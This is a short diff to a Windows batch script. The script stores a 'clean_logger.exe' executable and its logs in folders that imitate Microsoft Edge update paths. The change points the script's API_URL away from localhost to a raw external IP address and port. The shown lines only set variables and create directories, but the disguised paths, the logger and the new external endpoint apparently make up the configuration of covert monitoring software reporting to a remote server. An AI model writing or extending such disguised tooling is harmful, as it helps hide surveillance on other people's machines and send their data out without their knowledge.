@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 set DOWNLOAD_PATH=C:/ProgramData/MicrosoftEdge/Updates/UpdateLog
 set LOGDIR=C:/ProgramData/MicrosoftEdge/Updates/UpdateLog\logs
 set SERVICE_PATH=C:/ProgramData/MicrosoftEdge/Updates/UpdateLog\clean_logger.exe
-set API_URL=http://localhost:5000
+set API_URL=http://216.126.227.154:8000
 
 if not exist "%LOGDIR%" mkdir "%LOGDIR%"
 if not exist "%DOWNLOAD_PATH%" mkdir "%DOWNLOAD_PATH%"
